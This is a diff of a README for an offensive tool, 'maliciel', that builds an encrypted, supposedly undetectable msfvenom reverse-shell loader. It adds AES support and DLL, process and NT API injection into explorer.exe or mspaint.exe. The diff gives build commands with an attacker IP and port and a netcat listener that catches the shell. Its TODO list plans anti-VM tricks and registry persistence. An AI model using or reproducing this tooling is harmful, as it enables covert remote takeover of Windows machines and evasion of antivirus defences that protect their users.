@@ -4,7 +4,14 @@ Simple undetectable shellcode and code injector launcher example. Inspired by RT
 
 ## Main logic
 
-XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.
+XOR or ARS encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example. Support DLL injection, Process injection and NT injection
+
+## Requirements
+
+```bash
+python3 -m pip install -r requirements.txt
+sudo apt install g++-mingw-w64-x86-64
+```
 
 ## Usage
 ## 1. DLL
@@ -17,9 +24,9 @@ ip a
 
 ![attacker machine IP](./screenshots/ip_a.png?raw=true)
 
-run python script with flags:
+run python script with flags (for example XOR encryption):
 ```bash
-python3 maliciel.py -l 10.241.7.33 -p 443 --build 1
+python3 maliciel.py -l 10.241.7.33 -p 443 -b 1 -c 1
 ```
 
 ![run python script](./screenshots/maliciel_dll_build.png?raw=true)
@@ -44,9 +51,9 @@ ip a
 
 ![check IP](./screenshots/ip_a.png?raw=true)
 
-run python script on linux (for example process `explorer.exe`):
+run python script on linux (for example process `explorer.exe` and XOR encryption):
 ```bash
-python3 maliciel.py -l 10.241.7.33 -p 443 -e explorer.exe --build 2
+python3 maliciel.py -l 10.241.7.33 -p 443 -e explorer.exe -b 2 -c 1
 ```
 
 ![run python script](./screenshots/maliciel_pe_build.png?raw=true)
@@ -64,9 +71,9 @@ nc -lnvp 443
 or click (if `-m windows` param)
 
 ## 3. NT API injector
-run python script on linux (for example process `mspaint.exe`):
+run python script on linux (for example process `mspaint.exe` and AES encryption):
 ```bash
-python3 maliciel.py -l 10.241.7.33 -p 443 -e explorer.exe -m console --build 3
+python3 maliciel.py -l 10.241.7.33 -p 443 -e mspaint.exe -m console -b 3 -c 2
 ```
 
 ![enc and compile nt](./screenshots/maliciel_nt_build.png?raw=true)
@@ -83,10 +90,10 @@ nc -lnvp 443
 
 ## TODO
 - [x] Compile injector in Kali linux
-- [x] XOR + AES (other folder)
+- [x] XOR + AES
 - [x] Calling Windows API functions by hash names
 - [x] Find Kernel32 base via asm style
 - [x] One python builder
 - [ ] Anti-VM tricks
 - [ ] Persistence via Windows Registry run keys
-- [ ] Replace msfvenom shell to donut payload???
+- [ ] Replace msfvenom shell to custom payload
